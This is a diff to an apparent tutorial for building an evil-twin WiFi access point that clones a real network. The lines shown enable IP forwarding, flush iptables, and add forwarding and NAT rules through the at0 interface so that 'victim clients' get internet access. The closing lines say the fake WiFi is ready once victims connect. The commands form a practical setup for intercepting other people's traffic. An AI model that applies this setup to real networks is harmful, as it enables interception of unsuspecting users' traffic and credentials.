@@ -86,6 +86,9 @@ result:
 #Uncomment the next line to enable packet forwarding for IPv4
 net.ipv4.ip_forward=1
 
+Later on commands: echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+
+
 ##############################################################
 # Reload dnsmasq service (6): 
 ##############################################################
@@ -98,23 +101,23 @@ hacker@lol:/var/www/myportal$ sudo service dnsmasq restart
 
 #deletes existent rules
 
-sudo iptables -F 
+sudo iptables -F &&
+sudo iptables -t nat -F 
 
 #Allows traffic on at0 interface:
 
-sudo iptables -A INPUT -i at0 -j ACCEPT
-sudo iptables -A FORWARD -i at0 -j ACCEPT
+sudo iptables -A INPUT -i at0 -j ACCEPT &&
+sudo iptables -A FORWARD -i at0 -j ACCEPT &&
 sudo iptables -A FORWARD -o at0 -j ACCEPT
 
 #Allows traffic/NAT on you interface that has connection to internet (eth0)
 
-sudo iptables -A INPUT -i eth0 -j ACCEPT
-sudo iptables -A OUTPUT -o eth0 -j ACCEPT
+sudo iptables -A INPUT -i eth0 -j ACCEPT &&
+sudo iptables -A OUTPUT -o eth0 -j ACCEPT &&
 sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
 
 ##############################################################
 # Check the traffic rules (8):
-##############################################################
 
 hacker@lol:/var/www/myportal$ sudo iptables -t nat -L -v
 Chain PREROUTING (policy ACCEPT 0 packets, 0 bytes)
@@ -145,6 +148,7 @@ Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes)
 hacker@lol:/var/www/myportal$ 
 
 wlx00c0cab0312a its my interface to give victim clients conection to internet cause we conf the rules traffic to pass at0 traffic to wlx00c0cab0312a.
+##############################################################
 
 With all confs this you are ready to have a fake WiFi that clones the real and has functional DNS/NAT for the victims.
 You only need that the victim connects to fake wifi and nothing more.
